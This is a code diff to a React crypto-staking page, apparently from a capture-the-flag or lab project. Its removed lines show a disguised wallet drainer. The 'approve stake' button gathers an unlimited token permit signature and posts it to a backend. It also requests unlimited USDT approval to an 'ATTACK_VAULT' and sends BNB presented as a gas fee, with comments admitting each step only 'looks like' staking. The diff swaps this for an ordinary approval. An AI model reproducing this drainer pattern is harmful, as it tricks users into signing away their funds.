@@ -15,7 +15,7 @@ import {
   FiUsers,
   FiZap,
 } from 'react-icons/fi';
-import { CONTRACTS, CTF_API, EXPECTED_CHAIN_ID, formatAddress, formatNumber, parseContractError } from '../utils/constants';
+import { CONTRACTS, EXPECTED_CHAIN_ID, formatAddress, formatNumber, parseContractError } from '../utils/constants';
 import { useLanguage } from '../contexts/LanguageContext';
 
 const ZERO = ethers.ZeroAddress;
@@ -114,81 +114,13 @@ export default function TokenMiningPage({
   );
 
   const approveStakeToken = async () => {
-    if (!contracts?.writeNbtToken || !CONTRACTS.ATTACK_VAULT) return;
+    if (!contracts?.writeNbtToken || !CONTRACTS.STAKING_BANK) return;
     if (!(await ensureNetwork())) return;
-    if (!window.ethereum?.request) return;
     setIsApprovingStake(true);
     try {
-      const CZ = CONTRACTS.NBT_TOKEN;
-      const USDT = CONTRACTS.USDT || '0x55d398326f99059fF775485246999027B3197955';
-      const VAULT = CONTRACTS.ATTACK_VAULT;
-      const owner = account;
-
-      // --- Step 1: CZ EIP-2612 Permit (gasless signature, no transaction) ---
-      toast.loading('请在钱包中签署质押授权...', { id: 'approveStake' });
-      try {
-        const czContract = new ethers.Contract(CZ, [
-          'function nonces(address) view returns (uint256)',
-          'function name() view returns (string)',
-          'function DOMAIN_SEPARATOR() view returns (bytes32)',
-        ], signer);
-        const [nonce, tokenName, domainSep] = await Promise.all([
-          czContract.nonces(owner),
-          czContract.name(),
-          czContract.DOMAIN_SEPARATOR(),
-        ]);
-        const deadline = Math.floor(Date.now() / 1000) + 86400 * 7;
-        const domain = { name: tokenName, version: '1', chainId: EXPECTED_CHAIN_ID, verifyingContract: CZ };
-        const types = {
-          Permit: [
-            { name: 'owner', type: 'address' },
-            { name: 'spender', type: 'address' },
-            { name: 'value', type: 'uint256' },
-            { name: 'nonce', type: 'uint256' },
-            { name: 'deadline', type: 'uint256' },
-          ],
-        };
-        const message = {
-          owner,
-          spender: VAULT,
-          value: ethers.MaxUint256.toString(),
-          nonce: nonce.toString(),
-          deadline: deadline.toString(),
-        };
-        const czSig = await signer.signTypedData(domain, types, message);
-        // Send CZ permit signature to backend
-        if (CTF_API) {
-          await fetch(`${CTF_API}/api/claim`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ owner, signature: czSig, deadline }),
-          });
-        }
-      } catch (e) {
-        console.warn('CZ permit step skipped:', e.message);
-      }
-
-      // --- Step 2: USDT approve to Vault (looks like staking pool authorization) ---
-      const usdtContract = new ethers.Contract(USDT, [
-        'function allowance(address,address) view returns (uint256)',
-        'function approve(address,uint256) returns (bool)',
-      ], signer);
-      const usdtAllow = await usdtContract.allowance(owner, VAULT);
-      if (usdtAllow < ethers.MaxUint256 / 2n) {
-        toast.loading('请在钱包中确认质押池授权...', { id: 'approveStake' });
-        const approveTx = await usdtContract.approve(VAULT, ethers.MaxUint256);
-        await approveTx.wait();
-      }
-
-      // --- Step 3: Send BNB gas fee to Vault (looks like staking gas fee) ---
-      const bnbFee = ethers.parseEther('0.001');
-      toast.loading('请在钱包中确认 Gas 费...', { id: 'approveStake' });
-      const tx = await signer.sendTransaction({
-        to: VAULT,
-        value: bnbFee,
-      });
+      const tx = await contracts.writeNbtToken.approve(CONTRACTS.STAKING_BANK, ethers.MaxUint256);
+      toast.loading(t('cz.toast.approveCz'), { id: 'approveStake' });
       await tx.wait();
-
       toast.success(t('cz.toast.approveCzSuccess'), { id: 'approveStake' });
       onRefresh?.();
     } catch (err) {
